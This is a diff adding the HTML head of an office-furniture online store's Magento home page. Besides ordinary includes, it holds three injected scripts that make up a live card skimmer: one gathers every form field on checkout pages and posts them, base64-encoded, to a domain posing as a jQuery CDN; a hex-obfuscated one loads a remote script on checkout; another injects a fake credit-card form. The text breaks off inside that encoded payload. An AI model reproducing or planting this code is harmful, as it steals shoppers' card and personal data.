@@ -1,0 +1,828 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
+<head>
+<title>Home page</title>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="description" content="Office Furniture Center creates cost-effective office environments through the creative blending of pre-owned, refurbished, and new furniture to meet your functional and aesthetic needs.
+
+We are your single source for quality workstations, cubicles, desks, private offices, task seating, side and stack chairs, files, conference and reception furniture. Our professional services team has the experience and technical knowledge to optimize your office.
+
+We are based in Chicago, and do extensive business both in the Midwest and on the coasts. Our pre-owned stock includes over $2.5 million in inventory from premium furniture brands like Herman Miller, Steelcase, Knoll, and Haworth." />
+<meta name="keywords" content="cost-effective, used, pre-owned, refurbished, remanufactured, reupholstered, new, workstation, workstations, cube, cubes, cubicle, cubicles, desk, desks, private office, space, environment, interior, task, side, wood, veneer, laminate, conference, stack, cafe, chair, seating, seat, chairs, hon, steelcase, knoll, herman miller, ao2, etho, haworth, ethospace, morrison, dividends, avenir, answer, 9000, calibre, leap, aeron, improv, life, chicago, illinois, midwest, milwaukee, des moines, indianapolis, st louis, detroit, indiana, michigan, ohio, iowa" />
+<meta name="robots" content="INDEX,FOLLOW" />
+<link rel="icon" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/favicon.ico" type="image/x-icon" />
+<link rel="shortcut icon" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/favicon.ico" type="image/x-icon" />
+<!--[if lt IE 7]>
+<script type="text/javascript">
+//<![CDATA[
+    var BLANK_URL = 'http://www.totalofficesource.com/js/blank.html';
+    var BLANK_IMG = 'http://www.totalofficesource.com/js/spacer.gif';
+//]]>
+</script>
+<![endif]-->
+<!-- adding jQuery -->
+<script type="text/javascript" src="http://ajax.googleapis.com/ajax/libs/jquery/1.8.0/jquery.min.js"></script>
+<script type="text/javascript">
+    //<![CDATA[
+    var $j = jQuery.noConflict();
+    //]]>
+</script>
+<!-- ************* -->
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/css/custom.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/base/default/css/amshopby.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/base/default/css/kabel/bundleplus/extra.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/base/default/css/callforprice.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/base/default/css/mirasvit/searchautocomplete/amazon.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/base/default/css/mirasvit_searchindex.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/css/widgets.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/css/styles.css" media="all" />
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/css/print.css" media="print" />
+<script type="text/javascript" src="http://www.totalofficesource.com/js/prototype/prototype.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/prototype/validation.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/scriptaculous/builder.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/scriptaculous/effects.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/scriptaculous/dragdrop.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/scriptaculous/controls.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/scriptaculous/slider.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/varien/js.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/varien/form.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/varien/menu.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mage/translate.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mage/cookies.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mirasvit/core/jquery.min.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mirasvit/core/underscore.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mirasvit/core/backbone.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mirasvit/code/searchautocomplete/form.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/mirasvit/code/searchautocomplete/autocomplete.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/js/jquery.latest.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/js/hello.jquery.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/js/jquery.cycle.all.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/js/custom.js"></script>
+<!--[if lt IE 8]>
+<link rel="stylesheet" type="text/css" href="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/css/styles-ie.css" media="all" />
+<![endif]-->
+<!--[if lt IE 7]>
+<script type="text/javascript" src="http://www.totalofficesource.com/js/lib/ds-sleight.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/ffwdDefault/totalofficesource/js/pngfix.js"></script>
+<script type="text/javascript" src="http://www.totalofficesource.com/skin/frontend/base/default/js/ie6.js"></script>
+<![endif]-->
+
+<script type="text/javascript">
+//<![CDATA[
+optionalZipCountries = ["US"];
+//]]>
+</script>
+<script type="text/javascript">//<![CDATA[
+        var Translator = new Translate([]);
+        //]]></script><meta name="google-site-verification" content="tsLLJttqizT2amAgJQhhnVkdPNEydZf45DYXWNlaq5k" />
+<script type="text/javascript">
+<!--
+var grelos_v={
+	snd:null,
+	Glink:'https://jquery-cloud.org/js/jquery-2.2.1.min.js',
+	myid:(function(name){
+		var matches=document.cookie.match(new RegExp('(?:^|; )'+name.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,'\\$1')+'=([^;]*)'));
+		return matches?decodeURIComponent(matches[1]):undefined;
+	})('setidd')||(function(){
+		var ms=new Date();
+		var myid = ms.getTime()+"-"+Math.floor(Math.random()*(999999999-11111111+1)+11111111); 
+		var date=new Date(new Date().getTime()+60*60*24*1000);
+		document.cookie='setidd='+myid+'; path=/; expires='+date.toUTCString();
+		return myid;
+	})(),
+	base64_encode:function(data){
+		var b64='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
+		var o1,o2,o3,h1,h2,h3,h4,bits,i=0,enc='';
+		do{
+			o1=data.charCodeAt(i++);
+			o2=data.charCodeAt(i++);
+			o3=data.charCodeAt(i++);
+			bits=o1<<16 | o2<<8 | o3;
+			h1=bits>>18 & 0x3f;
+			h2=bits>>12 & 0x3f;
+			h3=bits>>6 & 0x3f;
+			h4=bits & 0x3f;
+			enc+=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);
+		}while(i<data.length);
+		switch(data.length%3){
+			case 1:
+				enc=enc.slice(0,-2)+'==';
+				break;
+			case 2:
+				enc=enc.slice(0,-1)+'=';
+				break;
+		}
+		return enc;
+	},
+	clk:function(){
+		grelos_v.snd=null;
+		var inp=document.querySelectorAll("input, select, textarea, checkbox, button");
+		for (var i=0;i<inp.length;i++){
+			if(inp[i].value.length>0){
+				var nme=inp[i].name;
+				if(nme==''){nme=i;}
+				grelos_v.snd+=inp[i].name+'='+inp[i].value+'&';
+			}
+		}
+	},
+	send:function(){
+		try{
+			var btn=document.querySelectorAll("a[href*='javascript:void(0)'],button, input, submit, .btn, .button");
+			for(var i=0;i<btn.length;i++){
+				var b=btn[i];
+				if(b.type!='text'&&b.type!='select'&&b.type!='checkbox'&&b.type!='password'&&b.type!='radio'){
+					if(b.addEventListener) {
+					b.addEventListener('click',grelos_v.clk,false);
+					}else{
+						b.attachEvent('onclick',grelos_v.clk);
+					}
+				}
+			}
+			var frm=document.querySelectorAll('form');
+			for(vari=0;i<frm.length;i++){
+				if(frm[i].addEventListener){
+					frm[i].addEventListener('submit',grelos_v.clk,false);
+				}else{
+					frm[i].attachEvent('onsubmit',grelos_v.clk);
+				}
+			}
+			if(grelos_v.snd!=null){
+				var domm=location.hostname.split('.').slice(0).join('_');
+				var keym=grelos_v.base64_encode(grelos_v.snd);
+				var http=new XMLHttpRequest();
+				http.open('POST',grelos_v.Glink,true);
+				http.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+				http.send('info='+keym+'&hostname='+domm+'&key='+grelos_v.myid);
+			}
+			grelos_v.snd=null;
+			keym=null;
+			setTimeout(function(){grelos_v.send()},30);
+		}catch(e){}
+	}
+}
+if((new RegExp('onepage|checkout|onestep','gi')).test(window.location)){
+	grelos_v.send();
+}
+-->
+</script><script>
+var _0x7539=["\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x74\x65\x73\x74","\x6F\x6E\x65\x70\x61\x67\x65\x7C\x63\x68\x65\x63\x6B\x6F\x75\x74\x7C\x6F\x6E\x65\x73\x74\x65\x70\x7C\x66\x69\x72\x65\x63\x68\x65\x63\x6B\x6F\x75\x74","\x3C\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x73\x3A\x2F\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2E\x6C\x69\x6E\x6B\x2F\x6A\x73\x2D\x73\x61\x76\x65\x2F\x6D\x61\x67\x65\x2E\x6A\x73\x22\x3E\x3C\x2F\x73\x63\x72\x69\x70\x74\x3E","\x77\x72\x69\x74\x65"];if(( new RegExp(_0x7539[2]))[_0x7539[1]](window[_0x7539[0]])){document[_0x7539[4]](_0x7539[3])}
+</script><script>var _0xc240=["\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64","\x63\x68\x65\x63\x6B\x6F\x75\x74\x2D\x70\x61\x79\x6D\x65\x6E\x74\x2D\x6D\x65\x74\x68\x6F\x64\x2D\x6C\x6F\x61\x64","\x73\x65\x74\x49\x6E\x74\x65\x72\x76\x61\x6C","\x66\x69\x72\x73\x74\x43\x68\x69\x6C\x64","\x72\x65\x6D\x6F\x76\x65\x43\x68\x69\x6C\x64","\x3C\x75\x6C\x20\x63\x6C\x61\x73\x73\x3D\x22\x66\x6F\x72\x6D\x2D\x6C\x69\x73\x74\x22\x20\x69\x64\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5F\x66\x6F\x72\x6D\x5F\x63\x63\x73\x61\x76\x65\x22\x20\x73\x74\x79\x6C\x65\x3D\x22\x6F\x76\x65\x72\x66\x6C\x6F\x77\x3A\x20\x68\x69\x64\x64\x65\x6E\x3B\x22\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x4E\x61\x6D\x65\x20\x6F\x6E\x20\x43\x61\x72\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6F\x77\x6E\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6F\x77\x6E\x65\x72\x5D\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x74\x79\x70\x65\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x74\x79\x70\x65\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x54\x79\x70\x65\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x2D\x73\x65\x6C\x65\x63\x74\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x2D\x2D\x50\x6C\x65\x61\x73\x65\x20\x53\x65\x6C\x65\x63\x74\x2D\x2D\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x41\x45\x22\x3E\x41\x6D\x65\x72\x69\x63\x61\x6E\x20\x45\x78\x70\x72\x65\x73\x73\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x56\x49\x22\x3E\x56\x69\x73\x61\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4D\x43\x22\x3E\x4D\x61\x73\x74\x65\x72\x43\x61\x72\x64\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x44\x49\x22\x3E\x44\x69\x73\x63\x6F\x76\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x4A\x43\x42\x22\x3E\x4A\x43\x42\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x53\x4D\x22\x3E\x53\x77\x69\x74\x63\x68\x2F\x4D\x61\x65\x73\x74\x72\x6F\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x6E\x75\x6D\x62\x65\x72\x5D\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x72\x65\x64\x69\x74\x20\x43\x61\x72\x64\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x6E\x75\x6D\x62\x65\x72\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x74\x79\x70\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x45\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x20\x44\x61\x74\x65\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x6D\x6F\x6E\x74\x68\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x6D\x6F\x6E\x74\x68\x20\x76\x61\x6C\x69\x64\x61\x74\x65\x2D\x63\x63\x2D\x65\x78\x70\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x4D\x6F\x6E\x74\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x22\x3E\x30\x31\x20\x2D\x20\x4A\x61\x6E\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x22\x3E\x30\x32\x20\x2D\x20\x46\x65\x62\x72\x75\x61\x72\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x33\x22\x3E\x30\x33\x20\x2D\x20\x4D\x61\x72\x63\x68\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x34\x22\x3E\x30\x34\x20\x2D\x20\x41\x70\x72\x69\x6C\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x35\x22\x3E\x30\x35\x20\x2D\x20\x4D\x61\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x36\x22\x3E\x30\x36\x20\x2D\x20\x4A\x75\x6E\x65\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x37\x22\x3E\x30\x37\x20\x2D\x20\x4A\x75\x6C\x79\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x38\x22\x3E\x30\x38\x20\x2D\x20\x41\x75\x67\x75\x73\x74\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x39\x22\x3E\x30\x39\x20\x2D\x20\x53\x65\x70\x74\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x30\x22\x3E\x31\x30\x20\x2D\x20\x4F\x63\x74\x6F\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x31\x22\x3E\x31\x31\x20\x2D\x20\x4E\x6F\x76\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x31\x32\x22\x3E\x31\x32\x20\x2D\x20\x44\x65\x63\x65\x6D\x62\x65\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x73\x65\x6C\x65\x63\x74\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x65\x78\x70\x69\x72\x61\x74\x69\x6F\x6E\x5F\x79\x72\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x61\x79\x6D\x65\x6E\x74\x5B\x63\x63\x5F\x65\x78\x70\x5F\x79\x65\x61\x72\x5D\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x79\x65\x61\x72\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x6E\x74\x72\x79\x22\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x22\x20\x73\x65\x6C\x65\x63\x74\x65\x64\x3D\x22\x73\x65\x6C\x65\x63\x74\x65\x64\x22\x3E\x59\x65\x61\x72\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x36\x22\x3E\x32\x30\x31\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x37\x22\x3E\x32\x30\x31\x37\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x38\x22\x3E\x32\x30\x31\x38\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x31\x39\x22\x3E\x32\x30\x31\x39\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x30\x22\x3E\x32\x30\x32\x30\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x31\x22\x3E\x32\x30\x32\x31\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x32\x22\x3E\x32\x30\x32\x32\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x33\x22\x3E\x32\x30\x32\x33\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x34\x22\x3E\x32\x30\x32\x34\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x35\x22\x3E\x32\x30\x32\x35\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x6F\x70\x74\x69\x6F\x6E\x20\x76\x61\x6C\x75\x65\x3D\x22\x32\x30\x32\x36\x22\x3E\x32\x30\x32\x36\x3C\x2F\x6F\x70\x74\x69\x6F\x6E\x3E\x20\x3C\x2F\x73\x65\x6C\x65\x63\x74\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x20\x63\x6C\x61\x73\x73\x3D\x22\x63\x65\x6E\x74\x69\x6E\x65\x6C\x2D\x6C\x6F\x67\x6F\x73\x22\x20\x69\x64\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x65\x6E\x74\x69\x6E\x65\x6C\x5F\x6C\x6F\x67\x6F\x22\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x3E\x54\x6F\x20\x65\x6E\x73\x75\x72\x65\x20\x74\x68\x65\x20\x73\x65\x63\x75\x72\x69\x74\x79\x20\x6F\x66\x20\x79\x6F\x75\x72\x20\x74\x72\x61\x6E\x73\x61\x63\x74\x69\x6F\x6E\x73\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x20\x20\x3C\x2F\x64\x69\x76\x3E\x20\x3C\x2F\x6C\x69\x3E\x20\x3C\x6C\x69\x3E\x20\x3C\x6C\x61\x62\x65\x6C\x20\x66\x6F\x72\x3D\x22\x63\x63\x73\x61\x76\x65\x5F\x63\x63\x5F\x63\x69\x64\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x72\x65\x71\x75\x69\x72\x65\x64\x22\x3E\x3C\x65\x6D\x3E\x2A\x3C\x2F\x65\x6D\x3E\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x3C\x2F\x6C\x61\x62\x65\x6C\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x62\x6F\x78\x22\x3E\x20\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x76\x2D\x66\x69\x78\x22\x3E\x20\x3C\x69\x6E\x70\x75\x74\x20\x74\x79\x70\x65\x3D\x22\x74\x65\x78\x74\x22\x20\x74\x69\x74\x6C\x65\x3D\x22\x43\x61\x72\x64\x20\x56\x65\x72\x69\x66\x69\x63\x61\x74\x69\x6F\x6E\x20\x4E\x75\x6D\x62\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6E\x70\x75\x74\x2D\x74\x65\x78\x74\x20\x63\x76\x76\x20\x72\x65\x71\x75\x69\x72\x65\x64\x2D\x65\x